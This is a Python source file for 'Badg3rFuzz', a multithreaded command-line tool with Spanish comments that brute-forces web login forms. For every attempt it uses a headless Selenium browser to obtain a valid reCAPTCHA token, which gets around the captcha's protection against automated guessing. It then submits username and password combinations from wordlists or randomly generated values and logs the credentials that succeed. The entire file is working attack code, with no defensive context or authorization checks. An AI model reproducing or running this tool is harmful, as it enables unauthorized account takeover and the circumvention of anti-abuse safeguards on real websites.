import argparse
import threading
from queue import Queue
import requests
import time
from datetime import datetime
import random
import string
import os
import sys
import queue
import signal
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#Variables globales para colores

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
GRAY = '\033[90m'

# Variables para barra de progreso
total_attempts = 0
attempts_done = 0
attempts_lock = threading.Lock()
start_time_prog = None
stop_event = threading.Event()

# Banner y funciones de impresión
def print_banner():
    # Códigos de color ANSI
    
    now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    
    banner = f"""

        {RED}{BOLD}██████╗  █████╗ ██████╗  ██████╗ ██████╗ ██████╗{RESET}        
       {RED}{BOLD}██╔══██╗██╔══██╗██╔══██╗██╔════╝ ╚════██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝███████║██║  ██║██║  ███╗ █████╔╝██████╔╝{RESET}       
       {RED}{BOLD}██╔══██╗██╔══██║██║  ██║██║   ██║ ╚═══██╗██╔══██╗{RESET}       
       {RED}{BOLD}██████╔╝██║  ██║██████╔╝╚██████╔╝██████╔╝██║  ██║{RESET}       
       {RED}{BOLD}╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{RESET}        
                                                                                                                                                        
       {GREEN}{BOLD}███████╗██╗   ██╗███████╗███████╗{RESET}         
       {GREEN}{BOLD}██╔════╝██║   ██║╚══███╔╝╚══███╔╝{RESET}        
       {GREEN}{BOLD}█████╗  ██║   ██║  ███╔╝   ███╔╝ {RESET}        
       {GREEN}{BOLD}██╔══╝  ██║   ██║ ███╔╝   ███╔╝  {RESET}        
       {GREEN}{BOLD}██║     ╚██████╔╝███████╗███████╗{RESET}        
       {GREEN}{BOLD}╚═╝      ╚═════╝ ╚══════╝╚══════╝{RESET}        
                                                                             
 {MAGENTA}══════════════════════════════════════════════════════════════════════════{RESET}  
                             {WHITE}{BOLD}🦡 Badg3rFuzz v1.0{RESET}
                             {BLUE}Start: {now}{RESET}
                                                                             
   {GREEN}[>]{RESET} {WHITE}Initializing Badg3rFuzz modules...{RESET}                                                            
                                                                             
"""
    print(banner)

def print_footer(start_time):
    end_time = datetime.now()
    dur = end_time - start_time
    print(f"{GREEN}[ ✔ ] Finished Attacks. Total: {attempts_done}{RESET}")
    print(f"\n⌛ Finished: {end_time.strftime('%d-%m-%Y %H:%M:%S')} (duration {dur})\n")

# Globales y flags
combo_queue = Queue()
success_flag = threading.Event()
print_lock = threading.Lock()

# Handler para señales
def signal_handler(signum, frame):
    print(f"\n{YELLOW}[!] Señal recibida ({signum}), iniciando cierre limpio...{RESET}")
    stop_event.set()
    success_flag.set()  # Para que los threads salgan de sus loops

def generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type="firefox", verbose=False):
    if verbose:
        print(f"[i] Inicializando WebDriver: {webdriver_type}")

    driver = None
    try:
        if webdriver_type.lower() == "chrome":
            chrome_options = ChromeOptions()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--log-level=3")  # ERROR
            chrome_options.add_argument("--disable-logging")
            chrome_options.add_argument("--disable-infobars")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
            service = ChromeService(ChromeDriverManager().install(), log_output=open(os.devnull, 'w'))
            driver = webdriver.Chrome(service=service, options=chrome_options)

        else:  # firefox por defecto
            try:
                script_dir = os.path.dirname(os.path.abspath(__file__))
                gecko_path = os.path.join(script_dir, "geckodriver.exe")
                
                if not os.path.isfile(gecko_path):
                    print(f"{RED}[!] No se encontró geckodriver.exe en: {gecko_path}{RESET}")
                    sys.exit(1)
                service = FirefoxService(executable_path=gecko_path)
            except:
                sys.exit()

            # Forzar headless con variables de entorno
            os.environ['MOZ_HEADLESS'] = '1'
            os.environ['DISPLAY'] = ':99'  # Para sistemas Linux sin display

            
            firefox_options = FirefoxOptions()
            # Múltiples formas de establecer headless para compatibilidad
            firefox_options.headless = True
            firefox_options.add_argument("--headless")
            firefox_options.add_argument("--no-sandbox")
            firefox_options.add_argument("--disable-dev-shm-usage")
            firefox_options.add_argument("--disable-gpu")
            firefox_options.add_argument("--window-size=1920,1080")
            
            # Suprimir logs y notificaciones
            firefox_options.set_preference("media.volume_scale", "0.0")
            firefox_options.set_preference("dom.webnotifications.enabled", False)
            firefox_options.set_preference("app.update.enabled", False)
            
            #Firefox location for specific platform
            if sys.platform == "win32":
                # Intentar múltiples rutas comunes en Windows
                possible_paths = [
                    r"C:\Program Files\Mozilla Firefox\firefox.exe",
                    r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
                    os.path.expanduser("~\\AppData\\Local\\Mozilla Firefox\\firefox.exe")
                ]
                firefox_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        firefox_path = path
                        break
                
                if firefox_path:
                    firefox_options.binary_location = firefox_path
                else:
                    print(f"{YELLOW}[!] Firefox no encontrado en rutas comunes, usando ruta por defecto{RESET}")
            else:
                # Para Linux/Mac
                possible_paths = ["/usr/bin/firefox", "/usr/local/bin/firefox", "/opt/firefox/firefox"]
                firefox_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        firefox_path = path
                        break
                if firefox_path:
                    firefox_options.binary_location = firefox_path
            
            driver = webdriver.Firefox(service=service, options=firefox_options)
        
        driver.get(login_url)

        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, "g-recaptcha"))
            )
        except:
            if verbose:
                print("[!] Timeout esperando captcha")
            pass

        token = driver.execute_script(f"""
            return new Promise(resolve => {{
                grecaptcha.ready(function() {{
                    grecaptcha.execute("{site_key}", {{action: "{captcha_action}"}}).then(function(token) {{
                        resolve(token);
                    }});
                }});
            }});
        """)

        cookies = {cookie["name"]: cookie["value"] for cookie in driver.get_cookies()}
        return token, cookies
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def cargar_diccionario(filepath):
    if not filepath or not os.path.exists(filepath):
        return []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def generar_fuzzers(tipo="digits", min_len=5, max_len=10, cantidad=100):
    chars = ''
    if tipo == "digits":
        chars = string.digits
    elif tipo == "digits+":
        chars = "123456789"
    elif tipo == "letters":
        chars = string.ascii_letters
    elif tipo == "mix":
        chars = string.ascii_letters + string.digits
    elif tipo == "strong":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        chars = string.digits

    fuzz = set()
    while len(fuzz) < cantidad:
        length = random.randint(min_len, max_len)
        fuzz.add(''.join(random.choices(chars, k=length)))
    return list(fuzz)

def check_success(response, error_indicators):
    try:
        data = response.json()
    except ValueError:
        # La respuesta no es JSON válido
        return False, "Invalid JSON response"

    if not data.get("Result", True):
        msg = data.get("Msg", "")
        for err in error_indicators:
            if err in msg:
                return False, err
        return False, "Unknown error"
    return True, None

def login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url=None, webdriver_type="firefox", verbose=False):
    token, cookies = generar_token_y_cookie(site_key, captcha_action, login_url, webdriver_type, verbose)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0",
        "Origin": origin_url if origin_url else login_url.split("/")[0],
        "Referer": login_url,
        "Accept": "*/*"
    }

    data = {
        "User": username,
        "Pass": password,
        "tokenCaptcha": token
    }

    with requests.Session() as s:
        s.cookies.update(cookies)
        response = s.post(post_url, headers=headers, data=data)
    return response

def worker(site_key, captcha_action, login_url, post_url, origin_url, stop_on_success, error_indicator, log_filename, webdriver_type, verbose):
    global attempts_done
    thread_id = threading.current_thread().ident
    
    while not success_flag.is_set() and not stop_event.is_set():
        try:
            # Timeout más corto para que el thread sea más responsivo a las señales
            username, password = combo_queue.get(timeout=0.5)
        except queue.Empty:
            # Si no hay más elementos y algún evento está set, salir
            if success_flag.is_set() or stop_event.is_set():
                break
            else:
                continue
        
        # Verificar nuevamente si debemos parar antes de procesar
        if stop_event.is_set() or success_flag.is_set():
            combo_queue.task_done()
            break
            
        try:
            response = login_attempt(username, password, site_key, captcha_action, login_url, post_url, origin_url, webdriver_type, verbose)
            
            with print_lock:
                print(f"\r{' ' * 80}\r", end='')
                if verbose:
                    print(f"[+] Login:password attempt : {username}:{password}")
                    print(f"[+] Server Response : HTTP Code {response.status_code}> {response.json()}")
                else:
                    print(f"[+] Attempt: {username}:{password}")

                success, error_msg = check_success(response, error_indicator)
                if success:
                    print(f"{GREEN}[+] Valid Login Found! {username}:{password}{RESET}")
                    with open(log_filename, "a", encoding="utf-8") as f:
                        f.write(f"SUCCESS: {username}:{password}\n")
                    success_flag.set()
                    if stop_on_success:
                        # Limpiar la cola
                        while not combo_queue.empty():
                            try:
                                combo_queue.get_nowait()
                                combo_queue.task_done()
                            except queue.Empty:
                                break
                else:
                    with open(log_filename, "a", encoding="utf-8") as f:
                        f.write(f"[-] FAIL: {username}:{password}\n")
                        
        except Exception as e:
            if not stop_event.is_set():
                with print_lock:
                    print(f"{RED}[!] Error con {username}:{password}: {e}{RESET}")
        finally:
            # Actualizar contador y marcar tarea como completada
            with attempts_lock:
                attempts_done += 1
            combo_queue.task_done()
            

def parse_user_fuzzer(fuzzer_str):
    # formato tipo:min_len:max_len:cantidad
    # ejemplo digits:6:6:100
    try:
        tipo, min_len, max_len, cantidad = fuzzer_str.split(":")
        return tipo, int(min_len), int(max_len), int(cantidad)
    except Exception as e:
        raise ValueError(f"Formato incorrecto para --user-fuzz: {fuzzer_str}. Debe ser tipo:min_len:max_len:cantidad") from e

def mostrar_barra_progreso():
    global total_attempts, attempts_done, start_time_prog
    if start_time_prog is None:
        start_time_prog = time.time()

    while not success_flag.is_set() and (attempts_done < total_attempts) and not stop_event.is_set():
        with attempts_lock:
            percent = (attempts_done / total_attempts) * 100 if total_attempts > 0 else 0
            elapsed = time.time() - start_time_prog
            speed = attempts_done / elapsed if elapsed > 0 else 0
            remaining = total_attempts - attempts_done
            eta = remaining / speed if speed > 0 else 0

        bar_length = 30
        filled_length = int(bar_length * attempts_done // total_attempts) if total_attempts else 0
        bar = '=' * filled_length + '-' * (bar_length - filled_length)

        with print_lock:
            print(f"\r{CYAN}[{bar}] {attempts_done}/{total_attempts} ({percent:.2f}%) | ETA: {eta:.1f}s{RESET}", end='', flush=True)

        time.sleep(0.2)

    # Imprime línea final al terminar
    with print_lock:
        print()

def preparar_combos(username_file, password_file, user_fuzzer):
    if username_file and os.path.exists(username_file):
        usernames = cargar_diccionario(username_file)
    else:
        # genera fuzz para usuarios
        if user_fuzzer:
            tipo, min_len, max_len, cantidad = parse_user_fuzzer(user_fuzzer)
            usernames = generar_fuzzers(tipo, min_len, max_len, cantidad)
        else:
            usernames = generar_fuzzers("digits", 5, 12, 20)

    if password_file and os.path.exists(password_file):
        passwords = cargar_diccionario(password_file)
    else:
        passwords = generar_fuzzers("strong", 8, 16, 20)

    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

def cleanup_and_exit(threads, start_time):
    """Función para limpiar recursos y salir de manera ordenada"""
    print(f"\n{YELLOW}[!] Iniciando cierre limpio...{RESET}")
    
    # Establecer eventos de parada
    stop_event.set()
    success_flag.set()
    
    # Limpiar la cola para evitar bloqueos
    while not combo_queue.empty():
        try:
            combo_queue.get_nowait()
            combo_queue.task_done()
        except queue.Empty:
            break
    
    # Esperar a que terminen todos los threads con timeout
    print(f"{YELLOW}[!] Esperando que terminen los hilos...{RESET}")
    for i, t in enumerate(threads):
        try:
            t.join(timeout=2.0)  # Timeout de 2 segundos por thread
            if t.is_alive():
                print(f"{RED}[!] Thread {i+1} no terminó en el tiempo esperado{RESET}")
        except:
            pass
    
    print_footer(start_time)

def main():
    # Configurar handlers de señales
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    parser = argparse.ArgumentParser(description="Badg3rScan - Fuzzer/fuerza bruta con recaptcha")
    parser.add_argument("--site-key", required=True, help="Site key del reCaptcha")
    parser.add_argument("--captcha-action", required=True, help="Action del reCaptcha")
    parser.add_argument("--login-url", required=True, help="URL donde se carga el captcha (frontend)")
    parser.add_argument("--post-url", required=True, help="URL para POST login")
    parser.add_argument("--pass-file", help="Archivo con passwords uno por línea")
    parser.add_argument("--user-file", help="Archivo con usuarios uno por línea")
    parser.add_argument("--user-fuzz", help="Fuzzer para usuarios tipo:min_len:max_len:cantidad (ejemplo digits:6:6:100)")
    parser.add_argument("--threads", type=int, default=5, help="Cantidad de hilos (default 5)")
    parser.add_argument("--stop-on-success", action="store_true", help="Detener al primer login válido")
    parser.add_argument("--origin-url", help="URL para la cabecera Origin (opcional)")
    parser.add_argument("--no-banner", action="store_true", help="Desactiva el banner genial de badg3rscan", default=False)
    parser.add_argument("--webdriver", choices=["chrome", "firefox"], default="firefox", help="Webdriver a usar: chrome o firefox (default firefox)")
    parser.add_argument("--verbose", action="store_true", help="Activa impresión detallada", default=False)

    args = parser.parse_args()
    if args.no_banner == False:
        print_banner()
    else:
        t = datetime.now()
        print(f"{WHITE}{BOLD}🦡 Badg3rFuzz v1.0 {RESET}")
        print(f"{BLUE}Inicio: {t.strftime('%d-%m-%Y %H:%M:%S')}{RESET}    ")

    preparar_combos(args.user_file, args.pass_file, args.user_fuzz)
    print(f"[>] Loading fuzzing payloads and brute force wordlists...")
    print(f"[>] {combo_queue.qsize()} combo prepares.")
    global total_attempts
    total_attempts = combo_queue.qsize()

    error_indicator = {
    "Usuario o contraseña erróneos.",
    "Acceso denegado por captcha"
    }

    log_filename = f"fuzzlog-{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.log"

    start_time = datetime.now()
    print(f"[>] Ready to fuzz and bruteforce your targets! 🦡💥")
    print(f"[>] Starting {args.threads} threads...")
    threads = []
    
    # Lanzar hilo de barra de progreso
    barra_thread = threading.Thread(target=mostrar_barra_progreso, daemon=True)
    barra_thread.start()
    
    try:
        # Crear y lanzar threads worker
        for _ in range(args.threads):
            t = threading.Thread(target=worker, args=(
                args.site_key,
                args.captcha_action,
                args.login_url,
                args.post_url,
                args.origin_url,
                args.stop_on_success,
                error_indicator,
                log_filename,
                args.webdriver,
                args.verbose
            ))
            t.daemon = False  # No daemon para poder hacer join
            t.start()
            threads.append(t)

        # Esperar a que terminen todos los trabajos o se detecte una interrupción
        while not stop_event.is_set() and not success_flag.is_set():
            try:
                # Verificar si todos los threads han terminado
                all_done = all(not t.is_alive() for t in threads)
                if all_done or combo_queue.empty():
                    break
                time.sleep(0.1)
            except KeyboardInterrupt:
                break
                
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Detectado Ctrl+C...{RESET}")
    finally:
        cleanup_and_exit(threads, start_time)
        sys.exit(0)

if __name__ == "__main__":
   main()